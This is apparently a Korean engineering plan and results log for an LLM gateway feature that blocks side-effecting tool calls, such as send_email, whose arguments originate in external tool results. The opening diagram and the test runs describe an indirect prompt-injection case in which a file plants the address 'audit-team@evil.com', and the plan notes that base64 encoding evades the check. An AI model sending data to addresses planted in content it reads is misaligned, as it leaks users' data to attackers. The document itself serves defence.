# ④ tool_call 통제 + 인수 출처 검사 구현 계획 (Phase 3b)

설계 문서: §8(3단계 방어), §7.3(응답 형태), §7.6(툴 등록), §9(tool_call 버퍼링), §10.
선행: Phase 3a — 머지됨.
후속: Phase 4(모델 티어 + 홀드백 + **스트리밍 ④**).

## 이 단계가 막는 것

3a 는 §8 의 ②쪽(외부 데이터가 들어왔다)을 잡았다. 3b 는 **④쪽 — 그 데이터가 행동으로
나가는 것**을 막는다.

```
send_email(to = "audit-team@evil.com")
                    │
   사용자 메시지에 있나?    없음
   시스템 프롬프트에 있나?  없음
   방금 읽은 파일에 있나?   ★ 있음
                    ▼
   사용자가 말한 적 없는 주소가 외부 파일에서 나왔다
   = 데이터가 지시로 바뀐 증거 → 차단
```

**실전에서 통하는 이유:** 공격자는 목적지를 반드시 적어야 한다. 메일 주소·URL·파일
경로를 툴 결과 안에 써놓지 않으면 공격이 성립하지 않는다. 정상적인 경우 그 값은 사용자
메시지나 시스템 프롬프트에서 온다. **출처가 다르다** (§8).

## 범위 밖 — 스트리밍 ④ 는 Phase 4 다

§9 는 **tool_call 버퍼링이 UX 손실 0**이라고 한다. 앱은 조각난 tool_call 로 아무것도 할
수 없고 어차피 다 모일 때까지 기다리므로, 프록시가 붙들고 있어도 손실이 없다.

즉 스트리밍 ④ 는 **원리적으로 가능하고 홀드백도 필요 없다.** 그런데 SSE 조각 누적·완성
감지·재방출은 Phase 4 가 만들 스트리밍 기계와 같은 코드다. 두 번 만들지 않는다.

**따라서 3b 는 비스트리밍 ④ 까지다.** 스트리밍에서 `tool_call` 프로그램이 있으면
`inspected` 에서 빠지고 WARNING 이 찍힌다 (2c 에서 세운 계약). §9 가 가능하다고 증명해
놨으므로 Phase 4 의 필수 항목이다 — "나중에 검토"가 아니다.

## Global Constraints

- 요청 경로다. Pydantic 금지, `orjson`, `re2`.
- **출처 검사는 근사법이다** (§8 한계). base64·철자 쪼개기로 우회된다. 1·2단계(오염,
  툴 종류)는 구조적 사실이라 우회가 어렵고, 3단계는 그 위에 얹는 보강이다.
  이 한계를 코드 주석과 문서에 남긴다 — 과신이 더 위험하다.
- **인수 값을 감사 로그에 남기지 않는다.** 인수 *이름* 과 툴 이름만 남긴다.
  §10 이 본문을 기본 저장하지 않는 것과 같은 이유다.

## 계획 단계에서 확정한 결정

### 결정 1. 툴 분류는 그래프 노드 설정에 둔다

§7.6 이 요구하는 것은 "앱이 신고하지 않는다"이다. 관리 주체가 보안 담당자면 된다.
가드레일은 admin API 로 저작하므로 그 조건을 만족한다.

노드에 두면 **발행·버전·롤백·감사가 공짜로 따라온다.** "왜 막혔지?"에 "v37 이
`send_email` 을 부작용 툴로 분류했다"로 답할 수 있다. 별도 테이블이면 그 시점의 분류를
복원할 수 없다.

대가: 가드레일 간 중복. §5 의 `SharedNode` 가 그 답이고 아직 없다. 툴 목록이 여러
가드레일에 퍼지기 시작하면 그때 만든다.

**설정은 `read_only` 목록 하나다.**

```json
{"read_only": ["read_file", "web_search"]}
```

목록에 없으면 부작용 있음 — 미등록 툴이 안전한 쪽으로 기본 처리된다 (§7.6). 부작용 툴을
따로 나열하지 않는 이유: 그러면 진실의 출처가 둘이 되고, 어느 쪽에도 없는 툴의 처리가
설정 실수에 달리게 된다. **안전한 기본값은 정책 선택이 아니라 구조여야 한다.**

### 결정 2. 새 노드 둘은 `tool_call` 전용이다

| 노드 | 입력 | 출력 | 설정 |
|---|---|---|---|
| `side_effect` | 0 (소스) | 이 호출이 부작용 툴인가 | `read_only: [...]` |
| `provenance` | 0 (소스) | 인수가 외부 데이터에서 왔는가 | `min_length: int` (기본 8) |

둘 다 `checkpoint` 를 요구하고 **`tool_call` 이어야 한다.** 다른 체크포인트에서는
평가할 tool_call 이 없으므로 `taint` 처럼 아무 값이나 내면 조용히 통과한다 →
`GUARDRAIL-015` 로 거부한다. 3a 의 `GUARDRAIL-014`(마스킹 위치)와 같은 방침이다.

`min_length` 가 필요한 이유: `"1"`·`"true"`·`"id"` 같은 짧은 값은 툴 결과에 우연히
나타난다. 임계값 없이는 정상 호출이 전부 걸린다.

### 결정 3. ④ 는 tool_call 마다 돌고, 하나라도 걸리면 응답 전체를 막는다

호출 하나만 빼고 나머지를 넘기면 모델의 계획이 반쯤 실행된다. 앱은 남은 툴을 부르고,
그 결과로 다시 요청이 온다. §7.3 의 형태(응답 전체가 `content_filter`)와도 맞는다.

### 결정 4. 인수 값의 출처는 세 갈래다

```
값이 신뢰 텍스트(user/system/developer)에 있다   → 정상. 사용자가 말한 것이다
값이 툴 결과에만 있다                          → ★ 외부에서 왔다. 증거
값이 어디에도 없다                             → 모델이 만든 것. 증거 아님
```

세 번째를 증거로 보지 않는 이유: 요약문·제목처럼 모델이 생성하는 값이 정상적으로
많다. 그것까지 막으면 오탐이 폭발한다.

### 결정 5. `arguments` 는 JSON 문자열이다

OpenAI 형식은 `function.arguments` 를 **문자열**로 준다. 파싱해서 문자열 값을 재귀
수집한다. 파싱이 실패하면 값이 없는 것으로 본다 — 우리가 먼저 터지면 가드레일이
가용성 문제가 된다.

## File Structure

```
backend/gateway/src/gateway/
  domain/models/guardrail.py           (수정) SIDE_EFFECT/PROVENANCE, arity, 015
  domain/exception/guardrail_error.py  (수정) GUARDRAIL-015
  application/plan/execution_plan.py   (수정) SideEffect, Provenance 명령
  application/plan/compiler.py          (수정) 방출 + 체크포인트 제한
  application/plan/executor.py          (수정) Subject.tool_name/foreign_args
  application/inspection/provenance.py  신규 — 인수 출처 검사
  application/inspection/text.py        (수정) extract_tool_calls, trusted/external 텍스트
  application/inspection/inspector.py   (수정) tool_call 체크포인트
  application/service/proxy_service.py  (수정) ④ 배선, 스트리밍 WARNING
tests/
  test_provenance.py 신규
  test_guardrail_domain.py  test_compiler.py  test_executor.py
  test_inspection_text.py   test_inspector.py  test_proxy_inspection.py
```

---

## Task 1: 도메인 — SIDE_EFFECT / PROVENANCE

**Files:** `domain/models/guardrail.py`, `domain/exception/guardrail_error.py`

**Produces:**
- `NodeType.SIDE_EFFECT`, `NodeType.PROVENANCE` (둘 다 arity `(0,0)`)
- `GuardrailError.WRONG_CHECKPOINT = ("GUARDRAIL-015", ...)`
- `_validate_side_effect`: `checkpoint == "tool_call"`, `read_only` 는 문자열 리스트
- `_validate_provenance`: `checkpoint == "tool_call"`, `min_length` 는 양의 정수(선택)

- [x] Step 1~4: 테스트 → 실패 확인 → 구현 → 커밋

테스트 성질:
1. `test_side_effect_requires_the_tool_call_checkpoint` — 다른 곳이면 `GUARDRAIL-015`
2. `test_provenance_requires_the_tool_call_checkpoint`
3. `test_side_effect_read_only_must_be_a_list_of_strings`
4. `test_side_effect_accepts_an_empty_read_only` — 전부 부작용으로 보는 정책
5. `test_side_effect_read_only_is_optional` → 없으면 전부 부작용
6. `test_provenance_min_length_must_be_positive`
7. `test_provenance_min_length_is_optional`
8. `test_both_are_sources` — 입력이 있으면 `GUARDRAIL-012`
9. `test_the_wrong_checkpoint_error_names_the_node`
10. `test_node_type_values_are_stable`

---

## Task 2: 인수 출처 검사

**Files:** `application/inspection/provenance.py`, `application/inspection/text.py`

**Produces:**
- `extract_tool_calls(body) -> list[tuple[int, dict]]` — `(choice 위치, tool_call)`
- `argument_strings(tool_call) -> list[tuple[str, str]]` — `(경로, 값)`
- `foreign_arguments(*, tool_call, trusted, external, min_length) -> tuple[str, ...]`

- [x] Step 1~5: 테스트 → 실패 확인 → 구현 → 커밋 → 돌연변이

테스트 성질:
1. `test_a_value_from_the_user_is_not_foreign` — 정상 업무
2. `test_a_value_from_a_tool_result_is_foreign` — §8 의 공격
3. `test_a_value_the_model_invented_is_not_foreign` — 요약문·제목
4. `test_a_value_in_both_is_not_foreign` — 사용자가 말했으면 정상
5. `test_a_short_value_is_ignored` — `"1"`, `"true"`
6. `test_the_threshold_is_configurable`
7. `test_nested_arguments_are_searched` — `{"a": {"b": "..."}}`
8. `test_array_arguments_are_searched`
9. `test_non_string_values_are_ignored` — 숫자·bool
10. `test_the_reported_path_names_the_argument` — `to`, `a.b`, `xs[0]`
11. `test_unparsable_arguments_yield_nothing` — 우리가 먼저 터지지 않는다
12. `test_a_missing_function_key_yields_nothing`
13. `test_the_system_prompt_is_trusted` — §8 이 신뢰 원천으로 든다
14. `test_extract_tool_calls_carries_the_choice_position`
15. `test_extract_tool_calls_of_a_text_response_is_empty`
16. `test_extract_tool_calls_skips_malformed_entries`

---

## Task 3: 실행기 + 컴파일러

**Files:** `execution_plan.py`, `executor.py`, `compiler.py`

**Produces:**
- `SideEffect(out, read_only: frozenset[str])`, `Provenance(out)`
- `Subject` += `tool_name: str = ""`, `foreign_args: tuple[str, ...] = ()`
- `_COST`: 둘 다 0 (소스, 사실 조회)

- [x] Step 1~5: 테스트 → 실패 확인 → 구현 → 커밋 → 돌연변이

테스트 성질:
1. `test_side_effect_is_false_for_a_read_only_tool`
2. `test_side_effect_is_true_for_a_listed_side_effecting_tool`
3. `test_an_unregistered_tool_is_side_effecting` — **§7.6 의 안전한 기본값**
4. `test_an_empty_tool_name_is_side_effecting` — 이름을 못 읽었으면 안전한 쪽
5. `test_provenance_is_true_when_foreign_args_exist`
6. `test_provenance_is_false_without_foreign_args`
7. `test_the_full_defence_shape` — `taint AND side_effect AND provenance → block`
8. `test_taint_and_side_effect_without_provenance_blocks` — §8 2단계만 쓰는 정책
9. `test_a_read_only_tool_passes_even_when_tainted` — 오탐 비용을 줄이는 지점
10. `test_side_effect_and_provenance_compile_to_instructions`
11. `test_they_only_appear_in_the_tool_call_program`
12. `test_the_order_is_still_hash_seed_independent`

---

## Task 4: ④ 검사 + 프록시 배선

**Files:** `inspection/inspector.py`, `service/proxy_service.py`

**Produces:**
- `Inspector.tool_call(plan, body, payload, *, mode, tainted)` — 호출마다 실행
- ④ 차단 시 응답 전체를 `content_filter` 로
- `inspected` 에 `tool_call`
- 감사 `verdicts` 에 증거(툴 이름, 인수 이름) — **값은 남기지 않는다**
- 스트리밍에 `tool_call` 프로그램이 있으면 WARNING + `inspected` 제외

- [x] Step 1~5: 테스트 → 실패 확인 → 구현 → 실제 기동 → 커밋 → 돌연변이

테스트 성질:
1. `test_a_tainted_side_effecting_call_is_blocked`
2. `test_a_read_only_call_passes_when_tainted`
3. `test_a_side_effecting_call_passes_when_clean` — 오염이 없으면 통과
4. `test_the_injected_address_is_blocked_by_provenance` — §8 전체 시나리오
5. `test_a_user_supplied_address_passes` — 정상 업무
6. `test_one_bad_call_blocks_the_whole_response` — 반쯤 실행되면 안 된다
7. `test_the_blocked_response_carries_no_tool_calls`
8. `test_a_text_response_still_runs_the_output_checkpoint`
9. `test_the_extension_reports_tool_call_inspected`
10. `test_audit_records_the_tool_name_and_argument_names`
11. `test_audit_does_not_record_argument_values` — §10
12. `test_dry_run_does_not_block_a_tool_call`
13. `test_a_stream_warns_and_omits_tool_call_from_inspected`
14. `test_audit_checkpoint_is_tool_call_when_it_blocks`

---

## Self-Review

**1. 계획 단계에서 고친 것**

- 툴 분류를 별도 테이블 + admin API 로 두려 했다. 노드 설정에 두면 발행·버전·롤백·감사가
  공짜로 따라오고, "왜 막혔지"에 그 시점의 분류로 답할 수 있다. 중복은 §5 의
  `SharedNode` 가 답이고 필요해질 때 만든다.
- `read_only` 와 `side_effecting` 을 둘 다 두려 했다 → `read_only` 하나다. 둘이면 어느
  쪽에도 없는 툴의 처리가 설정 실수에 달린다. 안전한 기본값은 구조여야 한다.
- "값이 어디에도 없다"를 증거로 보려 했다 → 모델이 생성하는 값(요약문·제목)이 정상적으로
  많다. 오탐이 폭발한다.
- 스트리밍 ④ 를 3b 에 넣으려 했다. §9 가 "버퍼링은 공짜"라고 하므로 원리적으로 가능하고
  홀드백도 필요 없지만, SSE 누적·재방출은 Phase 4 의 스트리밍 기계와 같은 코드다.
  두 번 만들지 않는다 — 대신 `inspected` 와 WARNING 으로 **보이게** 남긴다.

**2. 위험**

- 출처 검사는 근사법이다 (§8). `min_length` 가 낮으면 오탐, 높으면 미탐이다. 기본 8 은
  메일 주소·URL·경로를 잡고 `"true"` 를 놓치는 값이다. 튜닝은 dry-run 과 감사 로그로
  한다 — 그래서 `verdicts` 에 인수 이름을 남긴다.
- ④ 가 응답 전체를 막으므로 정상 호출이 하나 섞여 있어도 막힌다. 그것이 의도다(모델의
  계획이 반쯤 실행되면 안 된다). 오탐 비용은 `read_only` 목록과 오염 조건으로 줄인다.
- `Subject` 에 필드가 둘 늘어난다. 3a 에서 dataclass 로 둔 이유가 이것이다 — dict 면
  타이포가 조용히 통과한다.

**3. 열어두는 것**

- 승인(ask): §7.5 대로 앱 협조가 필수이고 §14 에서 미정이다. Phase 6.
- 정규화된 출처 비교(대소문자·공백·base64): §8 이 한계로 명시했다. 지금은 정확 부분
  문자열만 본다. 근사법을 정교하게 만들수록 과신 위험이 커진다는 점을 문서에 남긴다.

---

## 실행 결과 (2026-08-13)

전부 완료. `feat/phase3b-tool-call-control`. 860 tests (gateway 804 + shared_kernel 56).

### §8 의 공격 사슬이 끝까지 막힌다

실제 uvicorn + Postgres + ClickHouse, 폴링 주기 600초. 가짜 업스트림이 **툴 결과에서
메일 주소를 찾아 `send_email` 을 부른다** — 조종당한 LLM 을 흉내낸 것이다.

정책: `taint AND side_effect(read_only=[read_file, web_search]) AND provenance → block`

```
[200] 계약서 요약해줘 (파일에 지시 심김)   blocked  checks=['v']  finish=content_filter
[200] 사용자가 팀 주소로 보내라고 했다     allow    tool_calls 그대로 전달
[200] 툴 없이 발송 요청 (오염 없음)       allow    tool_calls 그대로 전달
[200] 오염됐지만 읽기 전용 툴만           allow
[200] 공격 + dry-run                    allow    would_have={'action':'blocked','checks':['v']}
```

정상 업무가 세 방향(오염 없음 / 읽기 전용 / 사용자가 준 값)에서 통과한다 — §8 이
말한 false-positive tax 를 줄이는 지점이다.

감사 로그:

```
action   checkpoint  tainted  checks  verdicts.evidence
blocked  tool_call   1        ['v']   [{"tool":"send_email","arguments":["to"]}]
```

인수 **값** 은 없다 (테스트로 고정). §10 이 본문을 기본 저장하지 않는 것과 같은 이유다.

### 실제 기동이 잡은 결함

**차단은 됐는데 `checks=[]` 로 나왔다.** `_Verdicts.checks` 와 `pending_model` 에
`tool_call` 을 더하는 편집이 안 먹었다 — ruff 가 그 줄을 한 줄로 합쳐 놓아서 치환
문자열이 안 맞았고, `assert` 없이 `replace` 를 쓴 자리라 조용히 지나갔다.

걸린 체크를 보고하지 않으면 정책 튜닝의 유일한 입력이 사라진다 (§4). dry-run 의
`would_have.checks` 도 비어 있었다 — dry-run 의 존재 이유가 그 목록이다.

**교훈:** 문자열 치환으로 코드를 고칠 때 `assert old in s` 없이 `replace` 하면 조용히
아무 일도 일어나지 않는다. 이번 세션에서 세 번 겪었고(2c 의 `_inspect_before_upstream`,
3b 의 `tool_call=`, `checks`) 세 번 다 테스트가 아니라 실제 기동이 잡았다.

### 돌연변이 테스트

26개 중 CAUGHT 23 → 26. 생존자 3개:

1. `extract_tool_calls` 의 choice 위치를 **아무도 쓰지 않았다.** ④ 는 응답 전체를
   막으므로 필요가 없다 → 반환에서 뺐다. 쓰이지 않는 값은 테스트로 고정할 수도 없다.
2. **노드 설정이 실행까지 도달하는지 확인하지 않았다.** `min_length` 를 0 으로 바꿔도,
   `read_only` 를 버려도 통과했다. `foreign_arguments` 를 직접 부르는 테스트만 있었고
   그래프 설정 → 컴파일 → 실행 경로가 비어 있었다.
3. 감사 `checkpoint` 의 `TOOL_CALL` 분기 — 3a 와 같은 패턴이다.

### 계획에서 바뀐 것

계획대로 갔다. 구현 중 추가로 정한 것:

- `Provenance` 명령이 `min_length` 를 **직접 들고 있다.** 처음엔 검사기가 상수를
  쓰게 뒀는데, 그러면 도메인의 `min_length` 검증이 거짓말이 된다 — 검증은 하는데
  값은 안 쓰는 셈이다.
- provenance 노드가 여러 개면 **가장 낮은 임계값**을 쓴다. 가장 엄격한 정책이 이긴다.
- 출처 텍스트는 provenance 노드가 있을 때만 모은다 — 안 쓰는 정책은 비용이 0 이다.

### 남긴 것

- **스트리밍 ④** — §9 가 "tool_call 버퍼링은 UX 손실 0"이라고 증명해 놨으므로
  원리적으로 가능하고 홀드백도 필요 없다. SSE 누적·재방출이 Phase 4 의 스트리밍
  기계와 같은 코드라 미뤘다. `inspected` 에서 빠지고 WARNING 이 찍힌다.
  **Phase 4 의 필수 항목이다 — "나중에 검토"가 아니다.**
- 승인(ask): §7.5 대로 앱 협조 필수, §14 에서 미정. Phase 6.
- 정규화된 출처 비교(대소문자·base64): §8 이 한계로 명시. 근사법을 정교하게 만들수록
  과신 위험이 커진다.
